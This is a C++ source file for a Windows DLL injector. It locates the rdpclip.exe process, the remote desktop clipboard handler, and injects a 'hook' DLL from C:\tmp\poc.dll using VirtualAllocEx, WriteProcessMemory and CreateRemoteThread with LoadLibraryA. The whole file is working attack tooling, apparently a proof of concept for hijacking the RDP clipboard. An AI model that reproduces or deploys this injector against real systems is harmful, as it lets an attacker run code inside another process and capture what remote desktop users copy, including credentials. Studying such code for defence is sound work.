#include<Windows.h>
#include<Tlhelp32.h>
#include<stdio.h>
#include <comdef.h>

#define print printf

DWORD GetOneProcessPid(const char* FileName) {
	HANDLE hSnapShot;
	PROCESSENTRY32 pro32;

	pro32.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapShot == INVALID_HANDLE_VALUE) {
		print("[-] CreateSnapshot Failed...\n");
		return -1;
	}
	print("[+] CreateSnapshot Done...\n");

	bool bMore;
	bMore = Process32First(hSnapShot, &pro32);

	print("[*] Enum process pid now!\n");
	while (bMore) {
		_bstr_t b(pro32.szExeFile);
		const char* c = b;
		//print("%s\n", pro32.szExeFile);
		if (0 == strcmp(c, FileName)) {
			CloseHandle(hSnapShot);
			//print("%s\n", c);
			print("[+] Pid Found! %d\n", pro32.th32ProcessID);
			return pro32.th32ProcessID;
		}
		bMore = Process32Next(hSnapShot, &pro32);
	}
	CloseHandle(hSnapShot);

	return 0;
}
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
	return 0;
}

bool LoadDll(DWORD ProcessPid, const char* DllPath) {
	HANDLE hProcess;
	DWORD DllPathLen;
	PDWORD addr;
	HMODULE hModule;
	PDWORD FuncAddr;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessPid);
	if (hProcess == NULL) {
		print("[-] OpenProcess Failed...\n");
		return false;
	}
	print("[+] OpenProcess Success...\n");

	DllPathLen = strlen(DllPath) + 1; //+1的原因结尾需要\0 结尾

	addr = (PDWORD)VirtualAllocEx(
		hProcess, //申请指定进程的句柄
		NULL,  // 安全描述符
		DllPathLen,  // 申请内存的字节大小
		MEM_COMMIT,  // 
		PAGE_READWRITE // 内存的属性
	);

	if (addr == NULL) {
		print("[-] VirtualAllocEx Fail");
		return false;
	}

	print("[+] VirtualAllocEx Done!\n");
	WriteProcessMemory(hProcess, addr, DllPath, DllPathLen, NULL);

	print("[+] WriteProcessMemory Done!\n");
	hModule = GetModuleHandle(L"Kernel32.dll");

	// get the address of LoadLibraryA
	FuncAddr = (PDWORD)GetProcAddress(hModule, "LoadLibraryA");

	// use LoadLibraryA load the hook dll in rdpclip.exe
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(FuncAddr), addr, 0, NULL);
	if (hThread == NULL) {
		print("[-] CreateRemoteThread Fail\n");
		return false;
	}

	print("[+] Inject Success!\n");
	return true;
}


int main(int argc, char *argv[]) {
	print("[*] Starting...\n");
	DWORD pid = GetOneProcessPid("rdpclip.exe");
	if (0 == pid) {
		print("[-] Pid not Found!\n");
	}
	else {
		LoadDll(pid, "C:\\tmp\\poc.dll");
	}
	//system("pause");
	printf("operation done\n");
	return 0;
}